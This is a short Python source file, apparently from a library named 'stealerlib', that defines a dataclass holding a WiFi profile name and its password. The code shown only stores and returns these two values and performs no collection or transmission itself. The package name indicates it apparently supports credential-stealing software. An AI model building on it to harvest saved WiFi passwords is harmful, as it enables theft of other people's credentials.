# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/wifi/types.py
"""

from stealerlib.wifi import *


class WiFiTypes:

    @dataclass
    class SSID:
        profile: str
        password: str

        def conv(self) -> list:
            return [self.profile, self.password]